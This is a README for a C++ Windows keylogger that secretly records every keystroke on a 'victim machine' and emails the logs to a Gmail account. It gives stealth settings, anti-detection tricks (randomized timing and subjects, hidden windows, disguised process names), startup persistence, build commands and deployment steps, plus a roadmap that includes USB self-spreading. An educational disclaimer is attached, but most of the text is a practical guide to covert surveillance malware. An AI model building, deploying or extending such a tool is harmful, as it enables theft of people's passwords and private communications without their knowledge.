# Advanced Keylogger with Email Reporting

A sophisticated Windows keylogger with automatic email reporting capabilities, built in C++ for educational and security testing purposes.

## Table of Contents
- [Features](#features)
- [Technical Overview](#technical-overview)
- [Requirements](#requirements)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [File Structure](#file-structure)
- [Security Features](#security-features)
- [Compilation](#compilation)
- [Legal Disclaimer](#legal-disclaimer)
- [Contributing](#contributing)

## Features

### Core Functionality
- **Complete Keystroke Capture**: Records all keyboard input system-wide
- **Automatic Email Reporting**: Sends logs via Gmail SMTP
- **Smart Log Management**: Hourly log files with incremental updates
- **Random Intervals**: Anti-detection with randomized email timing (30-120 min)
- **Stealth Mode**: Completely invisible operation
- **Network Awareness**: Checks internet connectivity before sending

### Advanced Features
- **Incremental Reporting**: Only sends new content, not duplicates
- **Dynamic Email Subjects**: Randomized subjects to avoid spam filters
- **Window Context**: Captures active window information with timestamps
- **Auto-Recovery**: Handles file corruption and network failures
- **Portable**: Single executable with no external dependencies## Technical Overview

### Technologies Used
- **Language**: C++17
- **Compiler**: GCC (MinGW-w64)
- **APIs**: Windows API, WinINet
- **Email**: PowerShell Send-MailMessage
- **Threading**: std::thread for concurrent operations

## Requirements

### Target System (Victim Machine)
- **OS**: Windows 10/11 (any version)
- **Network**: Internet connection for email functionality
- **Permissions**: Standard user (Admin recommended for full functionality)

### Development System
- **Compiler**: GCC/MinGW-w64 or Visual Studio
- **Gmail Account**: With App Password enabled

## Installation

### Quick Start (Using Pre-compiled Binary)
1. Download `keyloggerEMAIL_portable_final.exe`
2. Copy to target system
3. Execute (preferably as Administrator)
4. No additional setup required

### Gmail Configuration Required
Before first use, you need to configure Gmail credentials in the source code:

```cpp
const std::string EMAIL_FROM = "your_email@gmail.com";
const std::string EMAIL_PASSWORD = "your_16_char_app_password";
const std::string EMAIL_TO = "destination@gmail.com";
```

## Configuration

### Email Settings
```cpp
// Timing Configuration
const int EMAIL_INTERVAL_MIN_MINUTES = 30;   // Minimum interval
const int EMAIL_INTERVAL_MAX_MINUTES = 120;  // Maximum interval

// SMTP Configuration  
const std::string SMTP_SERVER = "smtp.gmail.com";
const std::string SMTP_PORT = "587";
```

### Stealth Options
```cpp
#define invisible     // Makes console window invisible
#define bootwait      // Waits for system boot completion
#define mouseignore   // Ignores mouse clicks
```

## Usage

### Basic Operation
```bash
# Simple execution
.\keyloggerEMAIL_portable_final.exe

# Run in background (recommended)
Start-Process .\keyloggerEMAIL_portable_final.exe -WindowStyle Hidden
```

### Startup Integration
Add to Windows startup folder:
```
%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\
```

### Monitoring
```bash
# Check if running
Get-Process -Name "*keylogger*"

# View current logs
type "logs\*.log"

# Check email positions file
type "logs\.email_positions"
```

## File Structure

```
Keylogger/
├── keylogger.cpp                          # Basic keylogger
├── keyloggerEMAIL.cpp                     # Advanced version with email
├── keyloggerEMAIL_portable_final.exe      # Final executable
├── logs/                                  # Auto-created log directory
│   ├── 2025-08-30__14-30-00.log         # Hourly log files
│   ├── 2025-08-30__15-30-00.log
│   └── .email_positions                   # Email tracking file
└── README.md                              # This file
```

### Log File Format
```
[Window: Notepad - at 2025-08-30T14:30:15] hello_world[BACKSPACE][BACKSPACE]
[Window: Chrome - at 2025-08-30T14:31:20] google.com[ENTER]
```

## Security Features

### Anti-Detection Mechanisms
- **Randomized Timing**: Prevents pattern recognition
- **Variable Subjects**: Avoids email spam filters  
- **Silent Operation**: No UI elements or notifications
- **Minimal Footprint**: Low CPU and memory usage

### Data Protection
- **Incremental Sync**: Only new data is transmitted
- **Connectivity Checks**: Fails gracefully without internet
- **Local Backup**: All data stored locally as backup

### Stealth Techniques
- **Invisible Windows**: `FreeConsole()` + `ShowWindow(SW_HIDE)`
- **Silent PowerShell**: `-WindowStyle Hidden` execution
- **Generic Process Names**: Appears as normal system process

## Compilation

### Prerequisites
```bash
# Install MinGW-w64 (Windows)
# Or use any C++17 compatible compiler
```

### Build Commands

#### Standard Version
```bash
g++ -o keylogger.exe keylogger.cpp -lgdi32 -luser32
```

#### Advanced Email Version
```bash
g++ -static -o keyloggerEMAIL_portable_final.exe keyloggerEMAIL.cpp -lgdi32 -luser32 -lwininet
```

### Compilation Flags Explained
- `-static`: Embed all libraries (portable executable)
- `-lgdi32`: Windows graphics API
- `-luser32`: Windows user interface API  
- `-lwininet`: Windows internet functions

### Dependencies Verification
```bash
# Check DLL dependencies
objdump -p keyloggerEMAIL_portable_final.exe | findstr "DLL Name"
```

Expected output (Windows native only):
```
DLL Name: KERNEL32.dll
DLL Name: msvcrt.dll
DLL Name: USER32.dll
DLL Name: WININET.dll
```

## Performance Metrics

### Resource Usage
- **Memory**: ~6-8 MB RAM
- **CPU**: <0.1% on modern systems
- **Storage**: ~1-5 KB per hour of activity
- **Network**: Minimal (only during email send)

### Email Statistics
- **Frequency**: 19 emails/day average (well below Gmail's 500/day limit)
- **Size**: Typically 1-50 KB per email
- **Success Rate**: 99%+ with proper Gmail configuration

## Advanced Features

### Email Reporting System
```cpp
// Example email content
=== KEYLOGGER INCREMENTAL REPORT ===
Time: 2025-08-30 14:30:15
Only NEW activity since last report:

=== NEW in 2025-08-30__14-30-00.log ===
[Window: Chrome - at 2025-08-30T14:30:15] facebook.com[ENTER]
```

### Incremental Sync Algorithm
1. **Load Previous Positions**: Read `.email_positions` file
2. **Calculate New Content**: Read from last known position
3. **Send Only Deltas**: Email contains only new keystrokes
4. **Update Positions**: Save new file positions after successful send

### Randomization Engine
```cpp
// Generates intervals between 30-120 minutes
int getRandomInterval() {
    static std::random_device rd;
    static std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(EMAIL_INTERVAL_MIN_MINUTES, EMAIL_INTERVAL_MAX_MINUTES);
    return dis(gen);
}
```

## Legal Disclaimer

### IMPORTANT: This software is intended for:
- Educational purposes and learning cybersecurity concepts
- Authorized penetration testing and security auditing
- Personal use on your own devices
- Parental monitoring of minor children's devices (where legally permitted)

### This software should NOT be used for:
- Unauthorized surveillance of other people
- Corporate espionage or data theft
- Stalking or harassment of individuals
- Any illegal activities in your jurisdiction

### Legal Requirements:
- **Obtain explicit consent** before installing on any device you don't own
- **Comply with local laws** regarding privacy and surveillance
- **Use responsibly** and ethically in all circumstances

**The authors are not responsible for any misuse of this software. Users are solely responsible for ensuring their use complies with applicable laws and regulations.**

## Contributing

### How to Contribute
1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
4. **Push** to the branch (`git push origin feature/amazing-feature`)
5. **Open** a Pull Request

### Development Guidelines
- Follow C++ best practices and coding standards
- Test on multiple Windows versions
- Document new features thoroughly
- Ensure backward compatibility

### Bug Reports
Please include:
- Windows version and build
- Compiler version used
- Error messages or unexpected behavior
- Steps to reproduce the issue

## Support & Contact

### Getting Help
- Check this README for common issues
- Search existing GitHub issues
- Create a new issue for bugs or questions

### Security Issues
For security vulnerabilities, please contact privately before public disclosure.

## Version History

### v3.0 (Current) - Advanced Email Integration
- Automatic email reporting with Gmail SMTP
- Randomized timing for anti-detection
- Incremental sync system
- Enhanced stealth capabilities
- Fully portable executable

### v2.0 - Enhanced Logging
- Hourly log file rotation
- Window context capture
- Improved key mapping
- Better error handling

### v1.0 - Basic Keylogger
- Basic keystroke capture
- Simple file logging
- Windows API integration

## Roadmap

### Planned Features
- Database Storage: SQLite integration for better log management
- Multiple Email Providers: Support for Outlook, Yahoo, etc.
- Screenshot Capture: Periodic screen captures
- USB Spreading: Automatic deployment via USB devices
- Encrypted Communications: End-to-end encrypted email reports
- Web Interface: Remote control and monitoring dashboard

### Performance Improvements
- Memory Optimization: Reduce RAM usage further
- Compression: Compress logs before email transmission
- Batch Processing: Group multiple log files in single email

## Acknowledgments

### Technologies & Libraries
- **Windows API**: Core system integration
- **MinGW-w64**: Cross-compilation toolchain
- **PowerShell**: Email delivery mechanism
- **STL**: Standard Template Library for C++

### Inspiration
This project was developed for educational purposes to understand:
- Windows internals and API usage
- Network programming and SMTP protocols
- Steganography and anti-detection techniques
- System security and monitoring concepts

---

**Built with C++ | Stealth Technology | Email Integration | Security Research**


